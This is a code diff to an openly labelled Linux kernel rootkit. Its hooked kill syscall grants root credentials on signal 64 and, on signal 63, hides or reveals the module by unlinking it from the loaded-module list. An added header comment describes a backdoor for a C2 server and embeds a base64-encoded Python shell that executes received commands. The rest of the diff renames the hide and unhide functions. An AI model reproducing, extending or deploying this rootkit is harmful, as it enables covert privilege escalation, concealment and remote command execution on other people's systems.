@@ -1,3 +1,16 @@
+/*
+Linux Kernel Rootkit:
+    -   Use the Makefile to build the module.
+    -   ftracer.h is a helping module which is basically trying to override the system calls. (Author: xcellerator)
+    -   Hide and Unhide itself from modules lists.
+    -   Granting root permissions by updating root credentials.
+    -   Creating and executing the reverse shell/backdoor which can be used to connect to a C2 server.
+
+    eg-> reverse shell payload (base64 encoded): IyMjIyMjIyMjIyMjIyMjIyMjCiMgU2Vjb25kIFZlcnNpb24gIwojIyMjIyMjIyMjIyMjIyMjIyMKCmltcG9ydCBzb2NrZXQKaW1wb3J0IHN1YnByb2Nlc3MKCmltcG9ydCBvcwoKSE9TVCA9ICcwLjAuMC4wJwpQT1JUID0gMTIzNAoKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKcy5iaW5kKChIT1NULCBQT1JUKSkKcy5saXN0ZW4oMSkKcHJpbnQoIkxpc3RlbmluZyBvbiBwb3J0IDEyMzQiKQoKd2hpbGUgVHJ1ZToKICAgIGNvbm4sIGFkZHIgPSBzLmFjY2VwdCgpCiAgICBwcmludCgiQ29ubmVjdGlvbiBBY2NlcHRlZCBmcm9tOiB7fSIuZm9ybWF0KGFkZHIpKQogICAgZGF0YSA9IGNvbm4ucmVjdigxMDI0KS5kZWNvZGUoJ3V0Zi04JykKICAgIHRyeToKICAgICAgICBpZiBkYXRhOgogICAgICAgICAgICAjIEV4ZWN1dGUgdGhlIGNvbW1hbmQgYW5kIHNlbmQgYmFjayB0aGUgcmVzdWx0CiAgICAgICAgICAgICMgcmVzdWx0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoZGF0YS5zcGxpdCgpLCBzaGVsbD1UcnVlKQogICAgICAgICAgICBwcyA9IHN1YnByb2Nlc3MuUG9wZW4oZGF0YSwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuU1RET1VUKQogICAgICAgICAgICByZXN1bHQgPSBwcy5jb21tdW5pY2F0ZSgpWzBdICsgc3RyKCc7IHBpZDogJykuZW5jb2RlKCd1dGYtOCcpICsgc3RyKG9zLmdldHBpZCgpKS5lbmNvZGUoJ3V0Zi04JykgKyBzdHIoJzsgcHBpZDogJykuZW5jb2RlKCd1dGYtOCcpICsgc3RyKG9zLmdldHBwaWQoKSkuZW5jb2RlKCd1dGYtOCcpCgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHJlc3VsdCA9IHN0cihlKS5lbmNvZGUoJ3V0Zi04JykKCiAgICBjb25uLnNlbmQocmVzdWx0KQogICAgY29ubi5jbG9zZSgpCg==
+
+Author: shv-om
+*/
+
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
@@ -44,8 +57,8 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
 {
     void set_root(void);
 
-    void showme(void);
-    void hideme(void);
+    void unhide(void);
+    void hidenow(void);
 
     int sig = regs->si;
 
@@ -58,13 +71,13 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
 
     else if ((sig == 63) && (hidden == 0)){
         printk(KERN_INFO "mob: Hiding mob...\n");
-        hideme();
+        hidenow();
         hidden = 1;
     }
 
     else if ((sig == 63) && (hidden == 1)){
         printk(KERN_INFO "mob: Revealing mob...\n");
-        showme();
+        unhide();
         hidden = 0;
     }
 
@@ -80,8 +93,8 @@ static asmlinkage int hook_kill(pid_t pid, int sig)
 {
     void set_root(void);
 
-    void showme(void);
-    void hideme(void);
+    void unhide(void);
+    void hidenow(void);
 
     if (sig == 64){
         printk(KERN_INFO "mob: giving root..\n");
@@ -91,13 +104,13 @@ static asmlinkage int hook_kill(pid_t pid, int sig)
 
     else if ((sig == 63) && (hidden == 0)){
         printk(KERN_INFO "mob: Hiding mob...\n");
-        hideme();
+        hidenow();
         hidden = 1;
     }
 
     else if ((sig == 63) && (hidden == 1)){
         printk(KERN_INFO "mob: Revealing mob...\n");
-        showme();
+        unhide();
         hidden = 0;
     }
 
@@ -107,12 +120,12 @@ static asmlinkage int hook_kill(pid_t pid, int sig)
 
 
 /* Adding back the kernel module to the loaded module list...*/
-void showme(void){
+void unhide(void){
     list_add(&THIS_MODULE->list, prev_module);
 }
 
 /* Removing the kernel module name from he loaded module list to hide the exstence... */
-void hideme(void){
+void hidenow(void){
     prev_module = THIS_MODULE->list.prev;
     list_del(&THIS_MODULE->list);
 }
